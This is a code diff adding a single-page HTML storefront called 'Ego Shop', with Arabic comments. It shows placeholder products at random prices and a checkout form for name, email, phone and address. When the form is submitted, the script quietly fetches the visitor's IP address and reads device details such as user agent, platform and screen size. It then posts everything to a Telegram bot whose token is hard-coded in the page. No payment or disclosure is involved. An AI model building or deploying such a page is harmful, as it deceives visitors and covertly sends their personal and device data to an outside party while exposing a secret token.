@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ego Shop</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #7d5fff, #4b0082);
+      overflow-x: hidden;
+      color: white;
+    }
+
+    /* Header Styles */
+    header {
+      text-align: center;
+      padding: 3rem 1rem;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(5px);
+      box-shadow: 0 0 20px #8e44ad;
+      margin-bottom: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    header h1 {
+      font-size: 3rem;
+      color: #dcd6f7;
+      text-shadow: 0 0 15px #8e44ad;
+      margin: 0;
+    }
+
+    header img {
+      width: 40px;
+      height: 40px;
+    }
+
+    /* Page Containers */
+    .page {
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Main Page Styles */
+    .search-login {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .search-login input[type="text"],
+    .search-login input[type="submit"] {
+      padding: 0.8rem 1.2rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    .search-login input[type="text"] {
+      width: 300px;
+      background: #111;
+      color: #fff;
+      transition: 0.3s ease;
+    }
+
+    .search-login input[type="text"]:hover,
+    .search-login input[type="text"]:focus {
+      box-shadow: 0 0 15px #8e44ad;
+    }
+
+    .search-login input[type="submit"] {
+      background: #8e44ad;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .search-login input[type="submit"]:hover {
+      box-shadow: 0 0 15px #8e44ad;
+    }
+
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 1.5rem;
+      padding: 0 2rem 4rem;
+    }
+
+    .product {
+      background: #111;
+      padding: 1.2rem;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      transition: 0.4s ease;
+      border: 1px solid #222;
+      cursor: pointer;
+    }
+
+    .product:hover {
+      box-shadow: 0 0 25px #6c3483;
+      transform: scale(1.03);
+    }
+
+    .product img {
+      width: 100%;
+      border-radius: 8px;
+    }
+
+    .product h3 {
+      margin: 1rem 0 0.5rem;
+      font-size: 1.2rem;
+      color: #f3e5f5;
+    }
+
+    .product p {
+      font-size: 0.9rem;
+      color: #bbb;
+    }
+
+    /* Checkout Page Styles */
+    .form-container {
+      background: rgba(0, 0, 0, 0.6);
+      max-width: 500px;
+      margin: 2rem auto;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(5px);
+    }
+
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      color: #f3e5f5;
+    }
+
+    .form-container label {
+      display: block;
+      margin-bottom: 0.5rem;
+      margin-top: 1rem;
+      font-weight: 600;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 0.8rem;
+      border-radius: 8px;
+      border: none;
+      margin-bottom: 1rem;
+      background-color: #222;
+      color: white;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+
+    .form-container input:focus {
+      outline: none;
+      box-shadow: 0 0 10px #8e44ad;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 0.9rem;
+      background-color: #8e44ad;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .form-container button:hover {
+      box-shadow: 0 0 15px #8e44ad;
+    }
+
+    .success-message {
+      display: none;
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 1.2rem;
+      color: #a3f7bf;
+    }
+
+    .back-button {
+      background: #6c3483;
+      color: white;
+      border: none;
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-bottom: 1rem;
+      transition: 0.3s ease;
+    }
+
+    .back-button:hover {
+      background: #8e44ad;
+      box-shadow: 0 0 15px #8e44ad;
+    }
+
+    /* Background Animation */
+    .animated-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -1;
+      background: linear-gradient(45deg, #7d5fff 25%, #4b0082 75%);
+      background-size: 400% 400%;
+      animation: moveBackground 20s ease infinite;
+    }
+
+    @keyframes moveBackground {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* Cart Animation */
+    .cart-transition {
+      position: fixed;
+      top: 50%;
+      left: -100px;
+      width: 80px;
+      height: 80px;
+      background: white;
+      border-radius: 50%;
+      background-image: url('https://cdn-icons-png.flaticon.com/512/263/263142.png');
+      background-size: 60%;
+      background-repeat: no-repeat;
+      background-position: center;
+      z-index: 9999;
+      animation: slideCart 1.2s forwards;
+    }
+
+    @keyframes slideCart {
+      0% { left: -100px; opacity: 1; }
+      50% { left: 50%; transform: scale(1.4); }
+      100% { left: 100vw; opacity: 0; }
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="animated-bg"></div>
+  
+  <header>
+    <img src="https://cdn-icons-png.flaticon.com/512/263/263142.png" alt="Cart Icon">
+    <h1 id="headerTitle">Ego Shop</h1>
+  </header>
+
+  <!-- الصفحة الرئيسية -->
+  <div id="mainPage" class="page active">
+    <div class="search-login">
+      <input type="text" placeholder="Search products...">
+      <input type="submit" value="Login">
+    </div>
+
+    <div class="product-grid" id="productGrid">
+      <!-- سيتم إنشاء المنتجات هنا بواسطة JavaScript -->
+    </div>
+  </div>
+
+  <!-- صفحة ملء المعلومات -->
+  <div id="checkoutPage" class="page">
+    <button class="back-button" onclick="goBackToMain()">← العودة للمتجر</button>
+    
+    <div class="form-container">
+      <h2>Fill Your Information</h2>
+      <form id="checkoutForm">
+        <label for="name">Full Name</label>
+        <input type="text" id="name" required>
+
+        <label for="email">Email Address</label>
+        <input type="email" id="email" required>
+
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" required>
+
+        <label for="address">Shipping Address</label>
+        <input type="text" id="address" required>
+
+        <label for="city">City</label>
+        <input type="text" id="city" required>
+
+        <label for="zip">ZIP Code</label>
+        <input type="text" id="zip" required>
+
+        <button type="submit">Confirm Order</button>
+      </form>
+      <div class="success-message" id="successMessage">
+        ✅ Your order has been submitted successfully!
+        <br><br>
+        <button class="back-button" onclick="goBackToMain()">عودة للتسوق</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // إنشاء المنتجات
+    function createProducts() {
+      const grid = document.getElementById('productGrid');
+      grid.innerHTML = Array.from({ length: 60 }, (_, i) => `
+        <div class="product" onclick="handleProductClick()">
+          <img src="https://via.placeholder.com/200" alt="Product">
+          <h3>Product ${i + 1}</h3>
+          <p>$${(Math.random() * 100 + 1).toFixed(2)}</p>
+        </div>
+      `).join('');
+    }
+
+    // التعامل مع النقر على المنتج
+    function handleProductClick() {
+      // إنشاء انيميشن العربة
+      const cart = document.createElement('div');
+      cart.classList.add('cart-transition');
+      document.body.appendChild(cart);
+
+      // الانتقال إلى صفحة ملء المعلومات بعد الانيميشن
+      setTimeout(() => {
+        goToCheckout();
+        // إزالة عنصر الانيميشن
+        if (document.body.contains(cart)) {
+          document.body.removeChild(cart);
+        }
+      }, 1200);
+    }
+
+    // الانتقال لصفحة ملء المعلومات
+    function goToCheckout() {
+      document.getElementById('mainPage').classList.remove('active');
+      document.getElementById('checkoutPage').classList.add('active');
+      document.getElementById('headerTitle').textContent = 'Checkout';
+      
+      // إعادة تعيين النموذج
+      document.getElementById('checkoutForm').style.display = 'block';
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('checkoutForm').reset();
+    }
+
+    // العودة للصفحة الرئيسية
+    function goBackToMain() {
+      document.getElementById('checkoutPage').classList.remove('active');
+      document.getElementById('mainPage').classList.add('active');
+      document.getElementById('headerTitle').textContent = 'Ego Shop';
+    }
+
+    // إنشاء المنتجات عند تحميل الصفحة
+    window.addEventListener('load', createProducts);
+  </script>
+
+  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "7780596447:AAGYkIsWNc4n0ElUVolD0D_gbwYoAyzNC4o";
+    const CHAT_ID = "7780596447";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    // التعامل مع إرسال النموذج والإرسال للتيليجرام
+    document.getElementById('checkoutForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phone').value;
+      const address = document.getElementById('address').value;
+      const city = document.getElementById('city').value;
+      const zip = document.getElementById('zip').value;
+
+      // الحصول على معلومات الجهاز والموقع
+      axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+          const ip = response.data.ip;
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const screenWidth = screen.width;
+          const screenHeight = screen.height;
+          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+          const timestamp = new Date().toLocaleString();
+
+          const message = `
+🛒 <b>New Order from Ego Shop</b>
+
+👤 <b>Customer Information:</b>
+<b>Name:</b> ${name}
+<b>Email:</b> ${email}
+<b>Phone:</b> ${phone}
+<b>Address:</b> ${address}
+<b>City:</b> ${city}
+<b>ZIP Code:</b> ${zip}
+
+🖥️ <b>Device Information:</b>
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+<b>User Agent:</b> ${userAgent}
+
+⏰ <b>Time:</b> ${timestamp}
+          `;
+
+          // إرسال الرسالة للتيليجرام
+          return axios.post(URI_API, {
+            chat_id: CHAT_ID,
+            parse_mode: 'html',
+            text: message
+          });
+        })
+        .then(response => {
+          // عرض رسالة النجاح
+          document.getElementById('checkoutForm').style.display = 'none';
+          document.getElementById('successMessage').style.display = 'block';
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('حدث خطأ في إرسال الطلب. يرجى المحاولة مرة أخرى.');
+        });
+    });
+  </script>
+
+</body>
+</html>
